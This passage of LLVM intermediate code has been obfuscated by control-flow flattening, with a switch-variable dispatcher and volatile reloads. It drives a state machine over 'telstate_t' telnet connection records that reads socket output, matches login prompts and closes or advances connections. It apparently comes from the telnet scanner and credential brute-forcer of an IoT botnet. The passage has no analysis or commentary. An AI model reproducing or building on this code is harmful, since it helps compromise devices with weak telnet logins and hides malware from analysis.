  %1483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1482, i32 0, i32 2
  store i8 0, i8* %1483, align 8
  %1484 = load i32, i32* %2, align 4
  %1485 = sext i32 %1484 to i64
  %.reload128 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload128, i64 %1485
  %1487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1486, i32 0, i32 3
  store i8 1, i8* %1487, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1488:                                   ; preds = %loopEntry
  %1489 = load i32, i32* %2, align 4
  %1490 = sext i32 %1489 to i64
  %.reload127 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload127, i64 %1490
  %1492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1491, i32 0, i32 2
  store i8 7, i8* %1492, align 8
  store i32 -1615557552, i32* %switchVar
  br label %loopEnd

; <label>:1493:                                   ; preds = %loopEntry
  %1494 = load i32, i32* %2, align 4
  %1495 = sext i32 %1494 to i64
  %.reload126 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload126, i64 %1495
  %1497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1496, i32 0, i32 8
  %1498 = load i8*, i8** %1497, align 8
  call void @llvm.memset.p0i8.i64(i8* %1498, i8 0, i64 1024, i32 1, i1 false)
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1499:                                   ; preds = %loopEntry
  %1500 = load i32, i32* %2, align 4
  %1501 = sext i32 %1500 to i64
  %.reload125 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload125, i64 %1501
  %1503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1502, i32 0, i32 0
  %1504 = load i32, i32* %1503, align 16
  %1505 = load i32, i32* %2, align 4
  %1506 = sext i32 %1505 to i64
  %.reload124 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload124, i64 %1506
  %1508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1507, i32 0, i32 8
  %1509 = load i8*, i8** %1508, align 8
  %1510 = load i32, i32* %2, align 4
  %1511 = sext i32 %1510 to i64
  %.reload123 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload123, i64 %1511
  %1513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1512, i32 0, i32 7
  %1514 = load i16, i16* %1513, align 16
  %1515 = zext i16 %1514 to i32
  %1516 = call i32 @readUntil(i32 %1504, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1509, i32 1024, i32 %1515)
  %1517 = icmp ne i32 %1516, 0
  %1518 = select i1 %1517, i32 1565434108, i32 -1350563318
  store i32 %1518, i32* %switchVar
  br label %loopEnd

; <label>:1519:                                   ; preds = %loopEntry
  %1520 = load i32, i32* %2, align 4
  %1521 = sext i32 %1520 to i64
  %.reload122 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload122, i64 %1521
  %1523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1522, i32 0, i32 6
  store i32 0, i32* %1523, align 4
  %1524 = load i32, i32* %2, align 4
  %1525 = sext i32 %1524 to i64
  %.reload121 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload121, i64 %1525
  %1527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1526, i32 0, i32 7
  store i16 0, i16* %1527, align 16
  %1528 = load i32, i32* %2, align 4
  %1529 = sext i32 %1528 to i64
  %.reload120 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload120, i64 %1529
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1530, i32 0, i32 8
  %1532 = load i8*, i8** %1531, align 8
  %1533 = call i8* @strstr(i8* %1532, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %1534 = icmp ne i8* %1533, null
  %1535 = select i1 %1534, i32 -1069353083, i32 72011725
  store i32 %1535, i32* %switchVar
  br label %loopEnd

; <label>:1536:                                   ; preds = %loopEntry
  %1537 = load i32, i32* %2, align 4
  %1538 = sext i32 %1537 to i64
  %.reload119 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload119, i64 %1538
  %1540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1539, i32 0, i32 8
  %1541 = load i8*, i8** %1540, align 8
  call void @llvm.memset.p0i8.i64(i8* %1541, i8 0, i64 1024, i32 1, i1 false)
  %1542 = load i32, i32* %2, align 4
  %1543 = sext i32 %1542 to i64
  %.reload118 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload118, i64 %1543
  %1545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1544, i32 0, i32 0
  %1546 = load i32, i32* %1545, align 16
  %1547 = call i32 @sclose(i32 %1546)
  %1548 = load i32, i32* %2, align 4
  %1549 = sext i32 %1548 to i64
  %.reload117 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload117, i64 %1549
  %1551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1550, i32 0, i32 2
  store i8 0, i8* %1551, align 8
  %1552 = load i32, i32* %2, align 4
  %1553 = sext i32 %1552 to i64
  %.reload116 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload116, i64 %1553
  %1555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1554, i32 0, i32 3
  store i8 0, i8* %1555, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1556:                                   ; preds = %loopEntry
  %1557 = load i32, i32* %2, align 4
  %1558 = sext i32 %1557 to i64
  %.reload115 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload115, i64 %1558
  %1560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1559, i32 0, i32 8
  %1561 = load i8*, i8** %1560, align 8
  %1562 = call i32 @matchPrompt(i8* %1561)
  %1563 = icmp ne i32 %1562, 0
  %1564 = select i1 %1563, i32 -2082954192, i32 221175208
  store i32 %1564, i32* %switchVar
  br label %loopEnd

; <label>:1565:                                   ; preds = %loopEntry
  %1566 = load i32, i32* %2, align 4
  %1567 = sext i32 %1566 to i64
  %.reload114 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload114, i64 %1567
  %1569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1568, i32 0, i32 8
  %1570 = load i8*, i8** %1569, align 8
  call void @llvm.memset.p0i8.i64(i8* %1570, i8 0, i64 1024, i32 1, i1 false)
  %1571 = load i32, i32* %2, align 4
  %1572 = sext i32 %1571 to i64
  %.reload113 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload113, i64 %1572
  %1574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1573, i32 0, i32 0
  %1575 = load i32, i32* %1574, align 16
  %1576 = call i32 @sclose(i32 %1575)
  %1577 = load i32, i32* %2, align 4
  %1578 = sext i32 %1577 to i64
  %.reload112 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload112, i64 %1578
  %1580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1579, i32 0, i32 2
  store i8 0, i8* %1580, align 8
  %1581 = load i32, i32* %2, align 4
  %1582 = sext i32 %1581 to i64
  %.reload111 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload111, i64 %1582
  %1584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1583, i32 0, i32 3
  store i8 1, i8* %1584, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1585:                                   ; preds = %loopEntry
  %1586 = load i32, i32* %2, align 4
  %1587 = sext i32 %1586 to i64
  %.reload110 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload110, i64 %1587
  %1589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1588, i32 0, i32 2
  store i8 7, i8* %1589, align 8
  store i32 -1747717144, i32* %switchVar
  br label %loopEnd

; <label>:1590:                                   ; preds = %loopEntry
  %1591 = load i32, i32* %2, align 4
  %1592 = sext i32 %1591 to i64
  %.reload109 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload109, i64 %1592
  %1594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1593, i32 0, i32 8
  %1595 = load i8*, i8** %1594, align 8
  call void @llvm.memset.p0i8.i64(i8* %1595, i8 0, i64 1024, i32 1, i1 false)
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1596:                                   ; preds = %loopEntry
  %1597 = load i32, i32* %2, align 4
  %1598 = sext i32 %1597 to i64
  %.reload108 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload108, i64 %1598
  %1600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1599, i32 0, i32 0
  %1601 = load i32, i32* %1600, align 16
  %1602 = load i32, i32* %2, align 4
  %1603 = sext i32 %1602 to i64
  %.reload107 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload107, i64 %1603
  %1605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1604, i32 0, i32 8
  %1606 = load i8*, i8** %1605, align 8
  %1607 = load i32, i32* %2, align 4
  %1608 = sext i32 %1607 to i64
  %.reload106 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload106, i64 %1608
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1609, i32 0, i32 7
  %1611 = load i16, i16* %1610, align 16
  %1612 = zext i16 %1611 to i32
  %1613 = call i32 @readUntil(i32 %1601, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1606, i32 1024, i32 %1612)
  %1614 = icmp ne i32 %1613, 0
  %1615 = select i1 %1614, i32 1212525796, i32 1699604363
  store i32 %1615, i32* %switchVar
  br label %loopEnd

; <label>:1616:                                   ; preds = %loopEntry
  %1617 = load i32, i32* %2, align 4
  %1618 = sext i32 %1617 to i64
  %.reload105 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload105, i64 %1618
  %1620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1619, i32 0, i32 6
  store i32 0, i32* %1620, align 4
  %1621 = load i32, i32* %2, align 4
  %1622 = sext i32 %1621 to i64
  %.reload104 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload104, i64 %1622
  %1624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1623, i32 0, i32 7
  store i16 0, i16* %1624, align 16
  %1625 = load i32, i32* %2, align 4
  %1626 = sext i32 %1625 to i64
  %.reload103 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload103, i64 %1626
  %1628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1627, i32 0, i32 8
  %1629 = load i8*, i8** %1628, align 8
  %1630 = call i8* @strstr(i8* %1629, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %1631 = icmp ne i8* %1630, null
  %1632 = select i1 %1631, i32 184559960, i32 -564684710
  store i32 %1632, i32* %switchVar
  br label %loopEnd

; <label>:1633:                                   ; preds = %loopEntry
  %1634 = load i32, i32* %2, align 4
  %1635 = sext i32 %1634 to i64
  %.reload102 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload102, i64 %1635
  %1637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1636, i32 0, i32 8
  %1638 = load i8*, i8** %1637, align 8
  call void @llvm.memset.p0i8.i64(i8* %1638, i8 0, i64 1024, i32 1, i1 false)
  %1639 = load i32, i32* %2, align 4
  %1640 = sext i32 %1639 to i64
  %.reload101 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload101, i64 %1640
  %1642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1641, i32 0, i32 0
  %1643 = load i32, i32* %1642, align 16
  %1644 = call i32 @sclose(i32 %1643)
  %1645 = load i32, i32* %2, align 4
  %1646 = sext i32 %1645 to i64
  %.reload100 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload100, i64 %1646
  %1648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1647, i32 0, i32 2
  store i8 0, i8* %1648, align 8
  %1649 = load i32, i32* %2, align 4
  %1650 = sext i32 %1649 to i64
  %.reload99 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload99, i64 %1650
  %1652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1651, i32 0, i32 3
  store i8 0, i8* %1652, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1653:                                   ; preds = %loopEntry
  %1654 = load i32, i32* %2, align 4
  %1655 = sext i32 %1654 to i64
  %.reload98 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload98, i64 %1655
  %1657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1656, i32 0, i32 8
  %1658 = load i8*, i8** %1657, align 8
  %1659 = call i32 @matchPrompt(i8* %1658)
  %1660 = icmp ne i32 %1659, 0
  %1661 = select i1 %1660, i32 -992838374, i32 -1992523784
  store i32 %1661, i32* %switchVar
  br label %loopEnd

; <label>:1662:                                   ; preds = %loopEntry
  %1663 = load i32, i32* %2, align 4
  %1664 = sext i32 %1663 to i64
  %.reload97 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload97, i64 %1664
  %1666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1665, i32 0, i32 8
  %1667 = load i8*, i8** %1666, align 8
  call void @llvm.memset.p0i8.i64(i8* %1667, i8 0, i64 1024, i32 1, i1 false)
  %1668 = load i32, i32* %2, align 4
  %1669 = sext i32 %1668 to i64
  %.reload96 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload96, i64 %1669
  %1671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1670, i32 0, i32 0
  %1672 = load i32, i32* %1671, align 16
  %1673 = call i32 @sclose(i32 %1672)
  %1674 = load i32, i32* %2, align 4
  %1675 = sext i32 %1674 to i64
  %.reload95 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload95, i64 %1675
  %1677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1676, i32 0, i32 2
  store i8 0, i8* %1677, align 8
  %1678 = load i32, i32* %2, align 4
  %1679 = sext i32 %1678 to i64
  %.reload94 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload94, i64 %1679
  %1681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1680, i32 0, i32 3
  store i8 1, i8* %1681, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1682:                                   ; preds = %loopEntry
  %1683 = load i32, i32* %2, align 4
  %1684 = sext i32 %1683 to i64
  %.reload93 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload93, i64 %1684
  %1686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1685, i32 0, i32 2
  store i8 7, i8* %1686, align 8
  store i32 -352760673, i32* %switchVar
  br label %loopEnd

; <label>:1687:                                   ; preds = %loopEntry
  %1688 = load i32, i32* %2, align 4
  %1689 = sext i32 %1688 to i64
  %.reload92 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload92, i64 %1689
  %1691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1690, i32 0, i32 8
  %1692 = load i8*, i8** %1691, align 8
  call void @llvm.memset.p0i8.i64(i8* %1692, i8 0, i64 1024, i32 1, i1 false)
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1693:                                   ; preds = %loopEntry
  %1694 = load i32, i32* %2, align 4
  %1695 = sext i32 %1694 to i64
  %.reload91 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload91, i64 %1695
  %1697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1696, i32 0, i32 0
  %1698 = load i32, i32* %1697, align 16
  %1699 = load i32, i32* %2, align 4
  %1700 = sext i32 %1699 to i64
  %.reload90 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload90, i64 %1700
  %1702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1701, i32 0, i32 8
  %1703 = load i8*, i8** %1702, align 8
  %1704 = load i32, i32* %2, align 4
  %1705 = sext i32 %1704 to i64
  %.reload89 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload89, i64 %1705
  %1707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1706, i32 0, i32 7
  %1708 = load i16, i16* %1707, align 16
  %1709 = zext i16 %1708 to i32
  %1710 = call i32 @readUntil(i32 %1698, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1703, i32 1024, i32 %1709)
  %1711 = icmp ne i32 %1710, 0
  %1712 = select i1 %1711, i32 -1363209378, i32 -1532877147
  store i32 %1712, i32* %switchVar
  br label %loopEnd

; <label>:1713:                                   ; preds = %loopEntry
  %1714 = load i32, i32* %2, align 4
  %1715 = sext i32 %1714 to i64
  %.reload88 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload88, i64 %1715
  %1717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1716, i32 0, i32 6
  store i32 0, i32* %1717, align 4
  %1718 = load i32, i32* %2, align 4
  %1719 = sext i32 %1718 to i64
  %.reload87 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload87, i64 %1719
  %1721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1720, i32 0, i32 7
  store i16 0, i16* %1721, align 16
  %1722 = load i32, i32* %2, align 4
  %1723 = sext i32 %1722 to i64
  %.reload86 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload86, i64 %1723
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1724, i32 0, i32 8
  %1726 = load i8*, i8** %1725, align 8
  %1727 = call i8* @strstr(i8* %1726, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %1728 = icmp ne i8* %1727, null
  %1729 = select i1 %1728, i32 462138088, i32 1786763362
  store i32 %1729, i32* %switchVar
  br label %loopEnd

; <label>:1730:                                   ; preds = %loopEntry
  %1731 = load i32, i32* %2, align 4
  %1732 = sext i32 %1731 to i64
  %.reload85 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload85, i64 %1732
  %1734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1733, i32 0, i32 8
  %1735 = load i8*, i8** %1734, align 8
  call void @llvm.memset.p0i8.i64(i8* %1735, i8 0, i64 1024, i32 1, i1 false)
  %1736 = load i32, i32* %2, align 4
  %1737 = sext i32 %1736 to i64
  %.reload84 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload84, i64 %1737
  %1739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1738, i32 0, i32 0
  %1740 = load i32, i32* %1739, align 16
  %1741 = call i32 @sclose(i32 %1740)
  %1742 = load i32, i32* %2, align 4
  %1743 = sext i32 %1742 to i64
  %.reload83 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload83, i64 %1743
  %1745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1744, i32 0, i32 2
  store i8 0, i8* %1745, align 8
  %1746 = load i32, i32* %2, align 4
  %1747 = sext i32 %1746 to i64
  %.reload82 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload82, i64 %1747
  %1749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1748, i32 0, i32 3
  store i8 0, i8* %1749, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1750:                                   ; preds = %loopEntry
  %1751 = load i32, i32* %2, align 4
  %1752 = sext i32 %1751 to i64
  %.reload81 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload81, i64 %1752
  %1754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1753, i32 0, i32 8
  %1755 = load i8*, i8** %1754, align 8
  %1756 = call i32 @matchPrompt(i8* %1755)
  %1757 = icmp ne i32 %1756, 0
  %1758 = select i1 %1757, i32 1071248810, i32 -849897242
  store i32 %1758, i32* %switchVar
  br label %loopEnd

; <label>:1759:                                   ; preds = %loopEntry
  %1760 = load i32, i32* %2, align 4
  %1761 = sext i32 %1760 to i64
  %.reload80 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload80, i64 %1761
  %1763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1762, i32 0, i32 8
  %1764 = load i8*, i8** %1763, align 8
  call void @llvm.memset.p0i8.i64(i8* %1764, i8 0, i64 1024, i32 1, i1 false)
  %1765 = load i32, i32* %2, align 4
  %1766 = sext i32 %1765 to i64
  %.reload79 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload79, i64 %1766
  %1768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1767, i32 0, i32 0
  %1769 = load i32, i32* %1768, align 16
  %1770 = call i32 @sclose(i32 %1769)
  %1771 = load i32, i32* %2, align 4
  %1772 = sext i32 %1771 to i64
  %.reload78 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload78, i64 %1772
  %1774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1773, i32 0, i32 2
  store i8 0, i8* %1774, align 8
  %1775 = load i32, i32* %2, align 4
  %1776 = sext i32 %1775 to i64
  %.reload77 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload77, i64 %1776
  %1778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1777, i32 0, i32 3
  store i8 1, i8* %1778, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1779:                                   ; preds = %loopEntry
  %1780 = load i32, i32* %2, align 4
  %1781 = sext i32 %1780 to i64
  %.reload76 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload76, i64 %1781
  %1783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1782, i32 0, i32 2
  store i8 7, i8* %1783, align 8
  store i32 -192892366, i32* %switchVar
  br label %loopEnd

; <label>:1784:                                   ; preds = %loopEntry
  %1785 = load i32, i32* %2, align 4
  %1786 = sext i32 %1785 to i64
  %.reload75 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload75, i64 %1786
  %1788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1787, i32 0, i32 8
  %1789 = load i8*, i8** %1788, align 8
  call void @llvm.memset.p0i8.i64(i8* %1789, i8 0, i64 1024, i32 1, i1 false)
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1790:                                   ; preds = %loopEntry
  %1791 = load i32, i32* %2, align 4
  %1792 = sext i32 %1791 to i64
  %.reload74 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload74, i64 %1792
  %1794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1793, i32 0, i32 0
  %1795 = load i32, i32* %1794, align 16
  %1796 = load i32, i32* %2, align 4
  %1797 = sext i32 %1796 to i64
  %.reload73 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload73, i64 %1797
  %1799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1798, i32 0, i32 8
  %1800 = load i8*, i8** %1799, align 8
  %1801 = load i32, i32* %2, align 4
  %1802 = sext i32 %1801 to i64
  %.reload72 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload72, i64 %1802
  %1804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1803, i32 0, i32 7
  %1805 = load i16, i16* %1804, align 16
  %1806 = zext i16 %1805 to i32
  %1807 = call i32 @readUntil(i32 %1795, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1800, i32 1024, i32 %1806)
  %1808 = icmp ne i32 %1807, 0
  %1809 = select i1 %1808, i32 -599103773, i32 1273458029
  store i32 %1809, i32* %switchVar
  br label %loopEnd

; <label>:1810:                                   ; preds = %loopEntry
  %1811 = load i32, i32* %2, align 4
  %1812 = sext i32 %1811 to i64
  %.reload71 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload71, i64 %1812
  %1814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1813, i32 0, i32 6
  store i32 0, i32* %1814, align 4
  %1815 = load i32, i32* %2, align 4
  %1816 = sext i32 %1815 to i64
  %.reload70 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload70, i64 %1816
  %1818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1817, i32 0, i32 7
  store i16 0, i16* %1818, align 16
  %1819 = load i32, i32* %2, align 4
